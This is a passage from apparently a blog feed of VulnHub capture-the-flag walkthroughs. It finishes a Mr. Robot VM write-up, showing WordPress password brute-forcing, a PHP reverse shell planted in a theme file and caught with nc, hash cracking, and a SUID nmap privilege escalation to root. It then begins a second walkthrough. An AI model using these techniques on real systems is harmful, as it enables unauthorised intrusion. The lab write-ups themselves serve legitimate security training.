</span><span class='line'>root@kali:~/mrRobot# wpscan <span class="p">&amp;</span>ndash<span class="p">;</span>url 10.1.1.137 <span class="p">&amp;</span>ndash<span class="p">;</span>wordlist ~/mrRobot/pass.txt <span class="p">&amp;</span>ndash<span class="p">;</span>username elliot&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;    __          _______   _____
</span><span class='line'>    <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
</span><span class='line'>     <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __
</span><span class='line'>      <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\ </span>
</span><span class='line'>       <span class="se">\ </span> /<span class="se">\ </span> /  <span class="p">|</span> <span class="p">|</span>     ____<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>        <span class="se">\/</span>  <span class="se">\/</span>   <span class="p">|</span>_<span class="p">|</span>    <span class="p">|</span>_____/ <span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>
</span><span class='line'>
</span><span class='line'>    WordPress Security Scanner by the WPScan Team
</span><span class='line'>                   Version 2.8
</span><span class='line'>      Sponsored by Sucuri - https://sucuri.net
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   @&lt;em&gt;WPScan&lt;/em&gt;, @ethicalhack3r, @erwan_lr, pvdl, @&lt;em&gt;FireFart&lt;/em&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> URL: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/&quot;</span>&gt;http://10.1.1.137/&lt;/a&gt;
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Started: Mon Aug  <span class="m">8</span> 03:09:23 2016&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> robots.txt available under: <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/robots.txt&quot;</span>&gt;http://10.1.1.137/robots.txt&lt;/a&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  <span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> Login : elliot Password : ER28-0652&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'>  <span class="p">|</span> Id <span class="p">|</span> Login  <span class="p">|</span> Name <span class="p">|</span> Password  <span class="p">|</span>
</span><span class='line'>  +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span> elliot <span class="p">|</span>      <span class="p">|</span> ER28-0652 <span class="p">|</span>
</span><span class='line'>  +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Finished: Mon Aug  <span class="m">8</span> 03:11:37 2016
</span></code></pre></td></tr></table></div></figure></p>

<p>Found the password is <font color="red"><code>ER28-0652</code></font></p>

<p>However, there is another way to find out the WordPress login username and password, rather than brute force.</p>

<p>From the result of nikto scan, I noticed there is another file found <code>/license.txt</code>. By checking the source code of the file on <code>http://10.1.1.137/license.txt</code></p>

<p>I found:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;
</span><span class='line'>what you <span class="k">do</span> just pull code from Rapid9 or some s@#% since when did you become a script kitty?
</span><span class='line'>
</span><span class='line'>...truncated...
</span><span class='line'>
</span><span class='line'><span class="k">do</span> you want a password or something?
</span><span class='line'>
</span><span class='line'>...truncated...
</span><span class='line'>
</span><span class='line'><span class="nv">ZWxsaW90OkVSMjgtMDY1Mgo</span><span class="o">=</span>
</span><span class='line'>&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>By decoding the Base64 encoded string: <code>ZWxsaW90OkVSMjgtMDY1Mgo=</code>, I got a username / password <font color="red"><code>elliot:ER28-0652</code></font></p>

<p>and from nikto scan, I also noticed that the admin login page is <code>http://10.1.1.137/wp-login.php</code>.</p>

<p>So, try to login with the found username / password and succeed!.</p>

<p>Now heading to <code>Appearance</code> &ndash;> <code>Editor</code> &ndash;> <code>404.php</code> (notice here the theme is <code>twentyfifteen</code>) and replaced the content with <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">pentestmonkey&rsquo;s php reverse shell</a> (configured to connect back on port 443).</p>

<p>Then setup <code>NC</code> to listen on port <code>443</code>.</p>

<p>Now, by accessing the page <code>http://10.1.1.137/wp-content/themes/twentyfifteen/404.php</code> to trigger the reverse shell connect back to my attacking machine.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvnp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.137<span class="o">]</span> 47762
</span><span class='line'>Linux linux 3.13.0-55-generic <span class="c">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span>
</span><span class='line'> 09:01:50 up <span class="m">15</span> min,  <span class="m">0</span> users,  load average: 0.00, 0.02, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span><span class='line'><span class="nv">$ </span>ls -al
</span><span class='line'>total 84
</span><span class='line'>drwxr-xr-x  <span class="m">22</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> .
</span><span class='line'>drwxr-xr-x  <span class="m">22</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> ..
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> bin
</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> boot
</span><span class='line'>drwxr-xr-x  <span class="m">13</span> root root  <span class="m">3960</span> Aug  <span class="m">7</span>  <span class="m">2016</span> dev
</span><span class='line'>drwxr-xr-x  <span class="m">77</span> root root  <span class="m">4096</span> Aug  <span class="m">7</span>  <span class="m">2016</span> etc
</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> home
</span><span class='line'>lrwxrwxrwx   <span class="m">1</span> root root    <span class="m">33</span> Jun <span class="m">24</span>  <span class="m">2015</span> initrd.img -&gt; boot/initrd.img-3.13.0-55-generic
</span><span class='line'>drwxr-xr-x  <span class="m">16</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> lib
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> lib64
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>   <span class="m">2</span> root root <span class="m">16384</span> Jun <span class="m">24</span>  <span class="m">2015</span> lost+found
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> media
</span><span class='line'>drwxr-xr-x   <span class="m">4</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> mnt
</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> opt
</span><span class='line'>dr-xr-xr-x <span class="m">339</span> root root     <span class="m">0</span> Aug  <span class="m">7</span>  <span class="m">2016</span> proc
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>   <span class="m">3</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> root
</span><span class='line'>drwxr-xr-x  <span class="m">14</span> root root   <span class="m">500</span> Aug  <span class="m">7</span> 08:47 run
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> sbin
</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> srv
</span><span class='line'>dr-xr-xr-x  <span class="m">13</span> root root     <span class="m">0</span> Aug  <span class="m">7</span>  <span class="m">2016</span> sys
</span><span class='line'>drwxrwxrwt   <span class="m">5</span> root root  <span class="m">4096</span> Aug  <span class="m">7</span> 08:49 tmp
</span><span class='line'>drwxr-xr-x  <span class="m">10</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> usr
</span><span class='line'>drwxr-xr-x  <span class="m">11</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> var
</span><span class='line'>lrwxrwxrwx   <span class="m">1</span> root root    <span class="m">30</span> Jun <span class="m">24</span>  <span class="m">2015</span> vmlinuz -&gt; boot/vmlinuz-3.13.0-55-generic
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Then use python to get a better shell.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python -c <span class="p">&amp;</span>lsquo<span class="p">;</span>import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>/bin/bash<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/home/robot
</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 16
</span><span class='line'>drwxr-xr-x <span class="m">2</span> root  root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .
</span><span class='line'>drwxr-xr-x <span class="m">3</span> root  root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> ..
</span><span class='line'>-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> robot robot   <span class="m">33</span> Nov <span class="m">13</span>  <span class="m">2015</span> key-2-of-3.txt
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> robot robot   <span class="m">39</span> Nov <span class="m">13</span>  <span class="m">2015</span> password.raw-md5
</span><span class='line'>daemon@linux:/home/robot<span class="err">$</span>
</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>cat password.raw-md5
</span><span class='line'>cat password.raw-md5
</span><span class='line'>robot:c3fcd3d76192e4007dfb496cca67e13b
</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>cat /etc/passwd <span class="p">|</span> grep robot
</span><span class='line'>cat /etc/passwd <span class="p">|</span> grep robot
</span><span class='line'>robot:x:1002:1002::/home/robot:
</span></code></pre></td></tr></table></div></figure></p>

<p>Found the 2nd key file <code>key-2-of-3.txt</code>, but it only can be read by user <code>robot</code></p>

<p>However, I found the username <code>robot</code> and the MD5 hash value of his password <code>c3fcd3d76192e4007dfb496cca67e13b</code> in the file <code>/home/robot/password.raw-md5</code></p>

<p>By cracking the MD5 hash, I got <code>robot</code>&rsquo;s password is <font color="red"><code>abcdefghijklmnopqrstuvwxyz</code></font></p>

<p>Also, by checking the <code>/etc/passwd</code> file, I noticed that <code>robot</code> is a system user.</p>

<p>Now I can <code>su</code> to user <code>robot</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>su robot
</span><span class='line'>su robot
</span><span class='line'>Password: abcdefghijklmnopqrstuvwxyz&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;robot@linux:~<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Now, I can read the 2nd key:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robot@linux:~<span class="nv">$ </span>cat key-2-of-3.txt
</span><span class='line'>cat key-2-of-3.txt
</span><span class='line'>822c73956184f694993bede3eb39f959
</span></code></pre></td></tr></table></div></figure></p>

<p>The 2nd key is <font color="red"><code>822c73956184f694993bede3eb39f959</code></font></p>

<p>Now move on to enumeration and rooting, I found there is an <a href="https://www.exploit-db.com/papers/18168/" title="NMAP --interactive priviledge escalation">old version of NMAP vulnerability</a> which can be exploited to get ROOT:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robot@linux:/tmp<span class="nv">$ </span>/usr/local/bin/nmap -v
</span><span class='line'>/usr/local/bin/nmap -v&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting nmap 3.81 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.insecure.org/nmap/&quot;</span>&gt;http://www.insecure.org/nmap/&lt;/a&gt; <span class="o">)</span> at 2016-08-07 12:40 UTC
</span><span class='line'>No target machines/networks specified!
</span><span class='line'>QUITTING!
</span><span class='line'>robot@linux:/tmp<span class="nv">$ </span>ls -la /usr/local/bin/nmap
</span><span class='line'>ls -la /usr/local/bin/nmap
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root root <span class="m">504736</span> Nov <span class="m">13</span>  <span class="m">2015</span> /usr/local/bin/nmap
</span><span class='line'>robot@linux:/tmp<span class="nv">$ </span>/usr/local/bin/nmap <span class="p">&amp;</span>ndash<span class="p">;</span>interactive
</span><span class='line'>/usr/local/bin/nmap <span class="p">&amp;</span>ndash<span class="p">;</span>interactive&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting nmap V. 3.81 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.insecure.org/nmap/&quot;</span>&gt;http://www.insecure.org/nmap/&lt;/a&gt; <span class="o">)</span>
</span><span class='line'>Welcome to Interactive Mode <span class="p">&amp;</span>ndash<span class="p">;</span> press h &lt;enter&gt; <span class="k">for</span> <span class="nb">help</span>
</span><span class='line'>nmap&gt; !sh
</span><span class='line'>!sh&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;id&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>robot<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;pwd&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;pwd
</span><span class='line'>/tmp&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;cd /root&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cd /root&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;pwd&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;pwd
</span><span class='line'>/root&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;ls -al&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ls -al
</span><span class='line'>total 32
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .
</span><span class='line'>drwxr-xr-x <span class="m">22</span> root root <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> ..
</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-  <span class="m">1</span> root root <span class="m">4058</span> Nov <span class="m">14</span>  <span class="m">2015</span> .bash_history
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root <span class="m">3274</span> Sep <span class="m">16</span>  <span class="m">2015</span> .bashrc
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> root root <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .cache
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root    <span class="m">0</span> Nov <span class="m">13</span>  <span class="m">2015</span> firstboot_done
</span><span class='line'>-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root   <span class="m">33</span> Nov <span class="m">13</span>  <span class="m">2015</span> key-3-of-3.txt
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root  <span class="m">140</span> Feb <span class="m">20</span>  <span class="m">2014</span> .profile
</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-  <span class="m">1</span> root root <span class="m">1024</span> Sep <span class="m">16</span>  <span class="m">2015</span> .rnd&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;cat key-3-of-3.txt&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cat key-3-of-3.txt
</span><span class='line'>04787ddef27c3dee1ee161b21670b4e4&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Now we got ROOT and the 3rd key is <font color="red"><code>04787ddef27c3dee1ee161b21670b4e4</code></font></p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] SecTalks: BNE0x03 - Simple]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/06/08/vulnhub-sectalks-bne0x03-simple/"/>
    <updated>2016-06-08T22:07:21+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/06/08/vulnhub-sectalks-bne0x03-simple</id>
    <content type="html"><![CDATA[<p>&ldquo;Simple CTF is a boot2root that focuses on the basics of web based hacking. Once you load the VM, treat it as a machine you can see on the network, i.e. you don&rsquo;t have physical access to this machine. Therefore, tricks like editing the VM&rsquo;s BIOS or Grub configuration are not allowed. Only remote attacks are permitted. /root/flag.txt is your ultimate goal.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/robert-winkel,190/">Robert Winkel</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: SecTalks: BNE0x03 - Simple (<em>10.1.1.134/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li><code>CuteNews 2.0.3</code> remote file upload vulnerability</li>
<li>Exploit overlayfs local root vulnerability to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Exploit remote file upload vunlerability to upload webshell [<font color="FF8000">php-reverse-shell</font>]</li>
<li>Enumeration and exploit the local priviledge vulnerability to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
